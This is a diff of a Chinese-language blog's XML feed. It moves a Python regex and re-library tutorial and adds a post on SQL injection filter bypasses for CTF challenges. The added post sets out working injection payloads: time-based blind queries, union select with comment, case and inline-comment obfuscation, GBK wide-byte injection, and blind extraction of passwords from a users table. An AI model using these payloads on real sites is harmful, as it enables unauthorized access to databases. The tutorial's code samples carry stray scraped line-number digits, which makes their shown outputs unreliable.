+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> re.finditer(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span> m:</span><br><span class="line">        print(m.group(<span class="number">0</span>))</span><br><span class="line">结果为</span><br><span class="line"><span class="number">100081</span></span><br><span class="line"><span class="number">1000841234567</span></span><br></pre></td></tr></table></figure>
+<h3 id="2-2-6、re-sub-pattern-repl-string-count-0-flags-0"><a class="header-anchor" href="#2-2-6、re-sub-pattern-repl-string-count-0-flags-0">¶</a>2.2.6、re.sub(pattern, repl, string, count=0, flags=0)</h3>
+<p>在一个字符串中替换所有匹配正则表达式的子串返回替换后的字符串</p>
+<ul>
+<li>repl : 替换匹配字符串的字符串</li>
+<li>count : 匹配的最大替换次数<br>
+举例说明:</li>
+</ul>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">re.sub(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;:zipcode&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>)</span><br><span class="line">结果为</span><br><span class="line"><span class="string">&#x27;BIT:zipcode TSU:zipcode&#x27;</span><span class="number">1234</span></span><br></pre></td></tr></table></figure>
+<h2 id="2-3Re库的另一种等价用法（面向对象）"><a class="header-anchor" href="#2-3Re库的另一种等价用法（面向对象）">¶</a>2.3Re库的另一种等价用法（面向对象）</h2>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">rst=re.search(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT 100081&#x27;</span>)</span><br><span class="line">函数式的调用，一次性操作<span class="number">12</span></span><br><span class="line">pat=re.<span class="built_in">compile</span>(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>)</span><br><span class="line">rst=pat.search(<span class="string">&#x27;BIT 100081&#x27;</span>)</span><br><span class="line">编译后多次操作<span class="number">123</span></span><br></pre></td></tr></table></figure>
+<p>regex=re.complie(pattern,flags=0)<br>
+regex也有以上六种用法</p>
+<h2 id="2-4Re库的Match对象"><a class="header-anchor" href="#2-4Re库的Match对象">¶</a>2.4Re库的Match对象</h2>
+<blockquote>
+<p>Match对象是是一次匹配的结果，包含匹配的很多信息</p>
+</blockquote>
+<p>*<strong>以下是Match对象的属性*</strong></p>
+<ul>
+<li>.string 待匹配的文本</li>
+<li>.re 匹配时使用的patter对象（正则表达式）</li>
+<li>.pos 正则表达式搜索文本的开始位置</li>
+<li>.endpos 正则表达式搜索文本的结束位置</li>
+</ul>
+<p>*<strong>以下是Match对象的方法*</strong></p>
+<ul>
+<li>.group(0) 获得匹配后的字符串</li>
+<li>.start() 匹配字符串在原始字符串的开始位置</li>
+<li>.end() 匹配字符串在原始字符串的结束位置</li>
+<li>.span() 返回(.start(), .end())</li>
+</ul>
+<h2 id="2-5Re库的贪婪匹配和最小匹配"><a class="header-anchor" href="#2-5Re库的贪婪匹配和最小匹配">¶</a>2.5Re库的贪婪匹配和最小匹配</h2>
+<p>当正则表达式可以匹配长短不同的多项时，返回哪一个呢？Re库默认采用贪婪匹配，即返回匹配最长的子串</p>
+<p>*<strong>最小匹配*</strong></p>
+<ul>
+<li>*? 前一个字符0次或无限次扩展，最小匹配</li>
+<li>+? 前一个字符1次或无限次扩展，最小匹配</li>
+<li>?? 前一个字符0次或1次扩展，最小匹配</li>
+<li>{m,n}? 扩展前一个字符m至n次（含n），最小匹配</li>
+</ul>
+<p><strong>只要长度输出可能不同的，都可以通过在操作符后增加?变成最小匹配</strong></p>
+]]></content>
+      <categories>
+        <category>编程学习</category>
+        <category>python</category>
       </categories>
   </entry>
   <entry>
@@ -1099,146 +1300,6 @@ file -f:报错出具体内容</p>
       <categories>
         <category>web技术学习</category>
         <category>命令执行</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>python正则表达式和re库</title>
-    <url>/2021/01/04/python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%92%8Cre%E5%BA%93/</url>
-    <content><![CDATA[<p>正确使用正则表达式能省很多功夫</p>
-<a id="more"></a>
-<h2 id="1、正则表达式的语法"><a class="header-anchor" href="#1、正则表达式的语法">¶</a>1、正则表达式的语法</h2>
-<ul>
-<li>. 表示任何单个字符</li>
-<li>[] 字符集，对单个字符给出取值范围</li>
-<li>[^] 非字符集，对单个字符给出排除范围</li>
-<li>*前一个字符0次或者无限次扩展</li>
-<li>+前一个字符1次或无限次扩展</li>
-<li>?前一个字符0次或1次扩展</li>
-<li>|左右表达式任意一个</li>
-<li>{m}扩展前一个字符m次</li>
-<li>{m,n}扩展前一个字符m至n次</li>
-<li>^匹配字符串开头</li>
-<li>$匹配字符串结尾</li>
-<li>()分组标记，内部只能使用|操作符</li>
-<li>\d数字，等价于[0-9]</li>
-<li>\w单词字符，等价于[A-Z,a-z,0-9]</li>
-</ul>
-<h2 id="2、python中re库的使用"><a class="header-anchor" href="#2、python中re库的使用">¶</a>2、python中re库的使用</h2>
-<blockquote>
-<p>Re库是python的标准库，主要用于字符串匹配，调用方法：import re</p>
-</blockquote>
-<h3 id="2-1、正则表达式字符串的类型"><a class="header-anchor" href="#2-1、正则表达式字符串的类型">¶</a>2.1、正则表达式字符串的类型</h3>
-<p>re库采用raw string类型来表示正则表达式，表示为<br>
-<strong>r’text’</strong><br>
-raw string是不包含对转义符的再次转义的字符串，总而言就是string会对字符转义，而raw string不会，因为在正则表达中会出现转义符号，所以避免繁琐我们使用raw string</p>
-<h3 id="2-2、Re库主要功能函数"><a class="header-anchor" href="#2-2、Re库主要功能函数">¶</a>2.2、Re库主要功能函数</h3>
-<ul>
-<li><strong>re.search</strong>()在一个字符串中搜索正则表达式的第一个位置，返回match对象</li>
-<li>**re.match()**从一个字符串的开始位置起匹配正则表达式，返回match对象</li>
-<li>**re.findall()**搜索字符串，以列表类型返回全部能匹配的子串</li>
-<li>**re.split()**将一个字符串按照正则表达式匹配结果进行分割，返回列表类型</li>
-<li>**re.finditer()**搜索字符串，返回一个匹配结果的迭代类型，每个迭代元素是match对象</li>
-<li>**re.sub()**在一个字符串中替换所有匹配正则表达式的子串，返回替换后的字符串</li>
-</ul>
-<h4 id="2-2-1、re-search-pattern-string-flags-0"><a class="header-anchor" href="#2-2-1、re-search-pattern-string-flags-0">¶</a>2.2.1、re.search(pattern, string, flags=0)</h4>
-<p>在一个字符串中搜索正则表达式的第一个位置，返回match对象</p>
-<ul>
-<li>pattern : 正则表达式的字符串或原生字符串表示</li>
-<li>string : 待匹配字符串</li>
-<li>flags : 正则表达式使用时的控制标记</li>
-<li>re.I re.IGNORECASE 忽略正则表达式的大小写，[A‐Z]能够匹配小写字符</li>
-<li>re.M re.MULTILINE 正则表达式中的^操作符能够将给定字符串的每行当作匹配开始</li>
-<li>re.S re.DOTALL 正则表达式中的.操作符能够匹配所有字符，默认匹配除换行外的所有字符</li>
-</ul>
-<p>举例说明：</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">match = re.search(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT 100081&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> match:</span><br><span class="line">    print(match.group(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">结果为<span class="number">100081123456</span></span><br></pre></td></tr></table></figure>
-<h3 id="2-2-2、re-match-pattern-string-flags-0"><a class="header-anchor" href="#2-2-2、re-match-pattern-string-flags-0">¶</a>2.2.2、re.match(pattern, string, flags=0)</h3>
-<p>从一个字符串的开始位置起匹配正则表达式，返回match对象<br>
-参数同search函数<br>
-举例说明：</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">match = re.match(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT 100081&#x27;</span>)</span><br><span class="line">print(match.group(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">结果会报错，match为空，因为match函数是</span><br><span class="line">从字符串开始位置开始匹配，因为从开始位置没有匹配到，所以为空<span class="number">123456</span></span><br></pre></td></tr></table></figure>
-<h3 id="2-2-3、re-findall-pattern-string-flags-0"><a class="header-anchor" href="#2-2-3、re-findall-pattern-string-flags-0">¶</a>2.2.3、re.findall(pattern, string, flags=0)</h3>
-<p>搜索字符串，以列表类型返回全部能匹配的子串<br>
-参数同search<br>
-举例说明:</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">ls=re.findall(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>)</span><br><span class="line">print(ls)</span><br><span class="line"></span><br><span class="line">结果为[<span class="string">&#x27;100081&#x27;</span>, <span class="string">&#x27;100084&#x27;</span>]<span class="number">12345</span></span><br></pre></td></tr></table></figure>
-<h3 id="2-2-4、re-split-pattern-string-maxsplit-0-flags-0"><a class="header-anchor" href="#2-2-4、re-split-pattern-string-maxsplit-0-flags-0">¶</a>2.2.4、re.split(pattern, string, maxsplit=0, flags=0)</h3>
-<p>将一个字符串按照正则表达式匹配结果进行分割返回列表类型</p>
-<ul>
-<li>maxsplit : 最大分割数，剩余部分作为最后一个元素输出<br>
-举例说明 ：</li>
-</ul>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">re.split(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>)</span><br><span class="line">结果[<span class="string">&#x27;BIT&#x27;</span>, <span class="string">&#x27; TSU&#x27;</span>, <span class="string">&#x27; &#x27;</span>]</span><br><span class="line">re.split(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>, maxsplit=<span class="number">1</span>)</span><br><span class="line">结果[<span class="string">&#x27;BIT&#x27;</span>, <span class="string">&#x27; TSU100081&#x27;</span>]<span class="number">12345</span></span><br></pre></td></tr></table></figure>
-<h3 id="2-2-5、re-finditer-pattern-string-maxsplit-0-flags-0"><a class="header-anchor" href="#2-2-5、re-finditer-pattern-string-maxsplit-0-flags-0">¶</a>2.2.5、re.finditer(pattern, string, maxsplit=0, flags=0)</h3>
-<p>搜索字符串，返回一个匹配结果的迭代类型，每个迭代元素是match对象<br>
-参数同search<br>
-举例说明 :</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> re.finditer(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span> m:</span><br><span class="line">        print(m.group(<span class="number">0</span>))</span><br><span class="line">结果为</span><br><span class="line"><span class="number">100081</span></span><br><span class="line"><span class="number">1000841234567</span></span><br></pre></td></tr></table></figure>
-<h3 id="2-2-6、re-sub-pattern-repl-string-count-0-flags-0"><a class="header-anchor" href="#2-2-6、re-sub-pattern-repl-string-count-0-flags-0">¶</a>2.2.6、re.sub(pattern, repl, string, count=0, flags=0)</h3>
-<p>在一个字符串中替换所有匹配正则表达式的子串返回替换后的字符串</p>
-<ul>
-<li>repl : 替换匹配字符串的字符串</li>
-<li>count : 匹配的最大替换次数<br>
-举例说明:</li>
-</ul>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">re.sub(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;:zipcode&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>)</span><br><span class="line">结果为</span><br><span class="line"><span class="string">&#x27;BIT:zipcode TSU:zipcode&#x27;</span><span class="number">1234</span></span><br></pre></td></tr></table></figure>
-<h2 id="2-3Re库的另一种等价用法（面向对象）"><a class="header-anchor" href="#2-3Re库的另一种等价用法（面向对象）">¶</a>2.3Re库的另一种等价用法（面向对象）</h2>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">rst=re.search(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT 100081&#x27;</span>)</span><br><span class="line">函数式的调用，一次性操作<span class="number">12</span></span><br><span class="line">pat=re.<span class="built_in">compile</span>(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>)</span><br><span class="line">rst=pat.search(<span class="string">&#x27;BIT 100081&#x27;</span>)</span><br><span class="line">编译后多次操作<span class="number">123</span></span><br></pre></td></tr></table></figure>
-<p>regex=re.complie(pattern,flags=0)<br>
-regex也有以上六种用法</p>
-<h2 id="2-4Re库的Match对象"><a class="header-anchor" href="#2-4Re库的Match对象">¶</a>2.4Re库的Match对象</h2>
-<blockquote>
-<p>Match对象是是一次匹配的结果，包含匹配的很多信息</p>
-</blockquote>
-<p>*<strong>以下是Match对象的属性*</strong></p>
-<ul>
-<li>.string 待匹配的文本</li>
-<li>.re 匹配时使用的patter对象（正则表达式）</li>
-<li>.pos 正则表达式搜索文本的开始位置</li>
-<li>.endpos 正则表达式搜索文本的结束位置</li>
-</ul>
-<p>*<strong>以下是Match对象的方法*</strong></p>
-<ul>
-<li>.group(0) 获得匹配后的字符串</li>
-<li>.start() 匹配字符串在原始字符串的开始位置</li>
-<li>.end() 匹配字符串在原始字符串的结束位置</li>
-<li>.span() 返回(.start(), .end())</li>
-</ul>
-<h2 id="2-5Re库的贪婪匹配和最小匹配"><a class="header-anchor" href="#2-5Re库的贪婪匹配和最小匹配">¶</a>2.5Re库的贪婪匹配和最小匹配</h2>
-<p>当正则表达式可以匹配长短不同的多项时，返回哪一个呢？Re库默认采用贪婪匹配，即返回匹配最长的子串</p>
-<p>*<strong>最小匹配*</strong></p>
-<ul>
-<li>*? 前一个字符0次或无限次扩展，最小匹配</li>
-<li>+? 前一个字符1次或无限次扩展，最小匹配</li>
-<li>?? 前一个字符0次或1次扩展，最小匹配</li>
-<li>{m,n}? 扩展前一个字符m至n次（含n），最小匹配</li>
-</ul>
-<p><strong>只要长度输出可能不同的，都可以通过在操作符后增加?变成最小匹配</strong></p>
-]]></content>
-      <categories>
-        <category>编程学习</category>
-        <category>python</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>python之字符串前面加u,r,f的含义</title>
-    <url>/2021/01/08/python%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%89%8D%E9%9D%A2%E5%8A%A0u,r,f%E7%9A%84%E5%90%AB%E4%B9%89/</url>
-    <content><![CDATA[<p>版本 python3.6及以上</p>
-<a id="more"></a>
-<p><strong>1.u:表示unicode字符串</strong><br>
-字符串中存在中文的字符，在前面加上u</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; u&#39;这是一个中文的字符串。&#39;</span><br></pre></td></tr></table></figure>
-<p><strong>2.r:表示非转义的原始字符串</strong><br>
-字符串中存在\，要让它失效，要在前面加上r</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  print(r&#39;今天是七夕节,\n但是还是要加班！&#39;) #加上r就是\不转义</span><br><span class="line">  今天是七夕节,\n但是还是要加班！</span><br><span class="line">  </span><br><span class="line">print(&#39;今天是七夕节,\t但是还是要加班！&#39;)  #不加上r就是\转义</span><br><span class="line">今天是七夕节,	但是还是要加班！</span><br></pre></td></tr></table></figure>
-<p><strong>3.f:表示在字符串内支持大括号内的python 表达式</strong></p>
-<p>f-strings 是指以 f 或 F 开头的字符串，其中以 {} 包含的表达式会进行值替换。（目前支持python3.6版本）</p>
-<p>下面看下 f-strings 的使用方法</p>
-<p>基本使用（作用：替换值）</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;name &#x3D; &#39;hoxis&#39;</span><br><span class="line">&gt;&gt;&gt; age &#x3D; 18</span><br><span class="line">&gt;&gt;&gt; f&quot;hi, &#123;name&#125;, are you &#123;age&#125;&quot;</span><br><span class="line">#结果如下</span><br><span class="line">&#39;hi, hoxis, are you 18&#39;</span><br><span class="line">&gt;&gt;&gt; F&quot;hi, &#123;name&#125;, are you &#123;age&#125;&quot;</span><br><span class="line">&#39;hi, hoxis, are you 18&#39;</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>编程学习</category>
-        <category>python</category>
       </categories>
   </entry>
   <entry>
@@ -1787,6 +1848,95 @@ select 列名 from 库名.表名</p>
       </categories>
   </entry>
   <entry>
+    <title>sql注入常见注释及绕过</title>
+    <url>/2020/11/13/sql%E6%B3%A8%E5%85%A5%E5%B8%B8%E8%A7%81%E6%B3%A8%E9%87%8A%E5%8F%8A%E7%BB%95%E8%BF%87/</url>
+    <content><![CDATA[<p>针对一些ctf题目中的过滤</p>
+<a id="more"></a>
+<h3 id="一、绕过空格（注释符-，-a0）"><a class="header-anchor" href="#一、绕过空格（注释符-，-a0）">¶</a>一、绕过空格（注释符/* */，%a0）</h3>
+<p>1.两个空格代替一个空格（双写）</p>
+<p>2.<code>%a0</code>=空格</p>
+<p>3.最基本的绕过方法，用注释替换空格：<code>/*注释/*</code></p>
+<p>4.括号绕过空格</p>
+<p>如果空格被过滤，括号没有被过滤，可以用括号绕过。</p>
+<p>在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p>
+<p>例如：time based盲注：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1%27and(sleep(ascii(mid(database()from(1)for(1)))&#x3D;109))%23</span><br></pre></td></tr></table></figure>
+<p>上面的方法既没有逗号也没有空格。猜解database（）第一个字符ascii码是否为109，若是则加载延时。</p>
+<h3 id="二、引号绕过（使用十六进制）"><a class="header-anchor" href="#二、引号绕过（使用十六进制）">¶</a>二、引号绕过（使用十六进制）</h3>
+<p>会使用到引号的地方一般是在最后的where子句中。这个时候如果引号被过滤了，那么where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。</p>
+<p><strong>几乎没有任何注入能过滤十六进制。</strong></p>
+<h3 id="三、逗号绕过（使用from或者offset）"><a class="header-anchor" href="#三、逗号绕过（使用from或者offset）">¶</a>三、逗号绕过（使用from或者offset）</h3>
+<p>在使用盲注的时候，需要使用到<code>substr()</code>,<code>mid()</code>,<code>limit</code>。这些子句方法都需要使用到逗号。</p>
+<p>例如：</p>
+<p>使用from to：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> substr(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br><span class="line"><span class="keyword">select</span> mid(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+<p>使用join：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b</span><br></pre></td></tr></table></figure>
+<p>使用like：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> ascii(mid(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">80</span> #等价于</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">like</span> <span class="string">&#x27;r%&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>使用offset来绕过limit中的&quot;，&quot;：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
+<h3 id="四、比较符号（-）绕过（过滤了-：sqlmap盲注经常使用-，使用between的脚本）"><a class="header-anchor" href="#四、比较符号（-）绕过（过滤了-：sqlmap盲注经常使用-，使用between的脚本）">¶</a>四、比较符号（&lt;&gt;）绕过（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）</h3>
+<p>盲注的时候如果无法使用比较操作符，可使用<code>greatest()</code>、<code>least()</code>。（前者返回最大值，后者返回最小值）</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">0</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">64</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> greatest(ascii(substr(database(),<span class="number">0</span>,<span class="number">1</span>)),<span class="number">64</span>)<span class="operator">=</span><span class="number">64</span></span><br></pre></td></tr></table></figure>
+<p>使用between and：</p>
+<p>between a and b：返回a，b之间的数据，不包含b。</p>
+<h3 id="五、or-and-xor-not绕过"><a class="header-anchor" href="#五、or-and-xor-not绕过">¶</a>五、or and xor not绕过</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and&#x3D;&amp;&amp; ， or&#x3D;|| ， xor&#x3D;| ， not&#x3D;!</span><br></pre></td></tr></table></figure>
+<h3 id="六、绕过注释符号（-，–-后面跟一个空格））过滤"><a class="header-anchor" href="#六、绕过注释符号（-，–-后面跟一个空格））过滤">¶</a>六、绕过注释符号（#，–(后面跟一个空格））过滤</h3>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,3||&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>最后的or '1闭合查询语句的最后的单引号，或者：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,&#x27;</span><span class="number">3</span></span><br></pre></td></tr></table></figure>
+<h3 id="七、-绕过"><a class="header-anchor" href="#七、-绕过">¶</a>七、= 绕过</h3>
+<p>使用like 、rlike 、regexp(正则表达式) 或者 使用&lt; 或者 &gt;</p>
+<h3 id="八、绕过union，select，where等"><a class="header-anchor" href="#八、绕过union，select，where等">¶</a>八、绕过union，select，where等</h3>
+<p>1.使用注释符绕过：</p>
+<p>常用注释符：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;，-- , &#x2F;**&#x2F;, #, --+, -- -, ; , %00 , --a</span><br></pre></td></tr></table></figure>
+<p>用法：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">U<span class="comment">/**/</span> NION <span class="comment">/**/</span> SE<span class="comment">/**/</span> LECT <span class="comment">/**/</span><span class="keyword">user</span>，pwd <span class="keyword">from</span> <span class="keyword">user</span></span><br></pre></td></tr></table></figure>
+<p>2.使用大小写绕过：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;UnIoN/**/SeLeCT</span></span><br></pre></td></tr></table></figure>
+<p>3.内联注释绕过：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</span></span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>双关键字绕过（若删除掉第一个匹配的union就能绕过）：</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;UNIunionONSeLselectECT1,2,3--</span></span><br></pre></td></tr></table></figure>
+<p>5.使用URLencode，ascii编码，</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="number">53</span><span class="operator">%</span><span class="number">45</span><span class="operator">%</span><span class="number">4</span>c<span class="operator">%</span><span class="number">45</span><span class="operator">%</span><span class="number">43</span><span class="operator">%</span><span class="number">54</span>(ascii)</span><br></pre></td></tr></table></figure>
+<p>6.函数或特殊符号</p>
+<p>例如：表示admin，oracle中可以用 <code>'adm'||'in'</code> ,  mysql中可以用 <code>concat('adm','in')</code>; mssql中可以用：<code>'adm'+'in'</code></p>
+<h3 id="九、通用绕过（编码）"><a class="header-anchor" href="#九、通用绕过（编码）">¶</a>九、通用绕过（编码）</h3>
+<p>如URLEncode编码，ASCII,HEX,unicode编码绕过：</p>
+<p>如:urlencode: or 1=1即%6f%72%20%31%3d%31</p>
+<p>ASCII : Test可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</p>
+<h3 id="十、等价函数绕过（不同数据库）"><a class="header-anchor" href="#十、等价函数绕过（不同数据库）">¶</a>十、等价函数绕过（不同数据库）</h3>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">hex()、bin() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> ascii()</span><br><span class="line">sleep() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>benchmark()</span><br><span class="line">concat_ws()<span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>group_concat()</span><br><span class="line">mid()、substr() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="built_in">substring</span>()</span><br><span class="line">@<span class="variable">@user</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">user</span>()</span><br><span class="line">@<span class="variable">@datadir</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> datadir()</span><br></pre></td></tr></table></figure>
+<p>例如：substring()和substr()无法使用时：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">+</span><span class="keyword">and</span><span class="operator">+</span>ascii(<span class="built_in">lower</span>(mid((<span class="keyword">select</span><span class="operator">+</span>pwd<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users<span class="operator">+</span>limit<span class="operator">+</span><span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">=</span><span class="number">74</span></span><br></pre></td></tr></table></figure>
+<p>或者：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">substr((<span class="keyword">select</span> <span class="string">&#x27;password&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="number">0x70</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x69</span>) <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x70</span>) <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x71</span>) <span class="operator">=</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure>
+<h3 id="十一-宽字节注入"><a class="header-anchor" href="#十一-宽字节注入">¶</a>十一.宽字节注入</h3>
+<p>过滤’的时候往往利用的思路是将 ’ 转换为 ’ 。</p>
+<p>在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：</p>
+<p>（1）%df 吃掉 \ 具体的方法是 urlencode(‘) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：</p>
+<p>id=-1%df%27union select 1,user(),3–+</p>
+<p>（2）将 ’ 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。</p>
+<p>一般产生宽字节注入的PHP函数：</p>
+<p>1.replace（）：过滤 ’ \ ，将 ’ 转化为 ’ ，将 \  转为 \，将 &quot; 转为 &quot; 。用思路一。</p>
+<p>2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：’ , &quot; , \ 。用思路一</p>
+<p>（防御此漏洞，要将 mysql_query 设置为 binary 的方式）</p>
+<p>3.mysql_real_escape_string()：转义下列字符：</p>
+<p>\x00 \n \r \ ’ &quot; \x1a</p>
+<p>（防御，将mysql设置为gbk即可）</p>
+]]></content>
+      <categories>
+        <category>web技术学习</category>
+        <category>sql注入</category>
+      </categories>
+  </entry>
+  <entry>
     <title>sql注入之mysql学习基础(二)</title>
     <url>/2021/01/05/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80(%E4%BA%8C)/</url>
     <content><![CDATA[<p>介绍几种常见的mysql注入类型</p>
